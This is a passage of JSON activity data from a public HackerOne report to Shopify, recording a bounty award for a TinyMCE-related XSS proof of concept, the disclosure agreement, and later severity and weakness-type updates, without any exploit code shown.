Shopify accessible only to employees. We appreciated that \u003ca href=\"/jelmer\"\u003e@jelmer\u003c/a\u003e took the time to write a proof of concept, because it demonstrated that TinyMCE was exploitable when we did not think an exploit was possible was at first glance.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-09-25T20:51:31.121Z","updated_at":"2017-09-25T20:51:31.121Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Shopify"}},"bounty_amount":"2000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"jelmer","url":"/jelmer"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2022544,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-09-25T20:51:47.445Z","updated_at":"2017-09-25T20:51:47.445Z","first_to_agree":true,"actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2024304,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2017-09-26T14:26:37.367Z","updated_at":"2017-09-26T14:26:37.367Z","additional_data":{"old_severity":"None","new_severity":"Medium","old_severity_id":69830,"new_severity_id":78436},"actor":{"username":"shopify-peteryaworski","cleared":false,"url":"/shopify-peteryaworski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2024329,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks!","markdown_message":"\u003cp\u003eThanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-09-26T14:36:13.040Z","updated_at":"2017-09-26T14:36:13.040Z","actor":{"username":"jelmer","cleared":true,"url":"/jelmer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/636/5497b7f89b51e0320e32f2fd125a6dc9fe7e11dd_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2024362,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-09-26T14:46:20.891Z","updated_at":"2017-09-26T14:46:20.891Z","actor":{"username":"jelmer","cleared":true,"url":"/jelmer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/636/5497b7f89b51e0320e32f2fd125a6dc9fe7e11dd_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2024363,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-09-26T14:46:20.961Z","updated_at":"2017-09-26T14:46:20.961Z","actor":{"username":"jelmer","cleared":true,"url":"/jelmer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/636/5497b7f89b51e0320e32f2fd125a6dc9fe7e11dd_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2890027,"is_internal":false,"editable":false,"type":"Activities::ReportVulnerabilityTypesUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-06-15T18:51:40.066Z","updated_at":"2018-06-15T18:51:40.066Z","additional_data":{"added_weaknesses":[{"id":61,"name":"Cross-site Scripting (XSS) - Reflected"}],"removed_weaknesses":[{"id":57,"name":"Violation of Secure Design Principles"}]},"actor":{"username":"shopify-peteryaworski","cleared":false,"url":"/shopify-peteryaworski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2890028,"is_internal":false,"editable":false,"type":"Activities::ReportVulnerabilityTypesUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-06-15T18:51:52.253Z","updated_at":"2018-06-15T18:51:52.253Z","additional_data":{"added_weaknesses":[{"id":63,"name":"Cross-site Scripting (XSS) - DOM"}],"removed_weaknesses":[{"id":61,"name":"Cross-site Scripting (XSS) - Reflected"}]},"actor":{"username":"shopify-peteryaworski","cleared":false,"url":"/shopify-peteryaworski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2890029,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-06-15T18:52:23.326Z","updated_at":"2018-06-15T18:52:23.326Z","additional_data":{"old_severity":"Medium","new_severity":"Medium (4.2)","old_severity_id":78436,"new_severity_id":168654},"actor":{"username":"shopify-peteryaworski","cleared":false,"url":"/shopify-peteryaworski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2890032,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-06-15T18:52:53.077Z","updated_at":"2018-06-15T18:52:53.077Z","additional_data":{"old_severity":"Medium (4.2)","new_severity":"Medium (4.8)","old_severity_id":168654,"new_severity_id":168655},"actor":{"username":"shopify-peteryaworski","cleared":false,"url":"/shopify-peteryaworski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}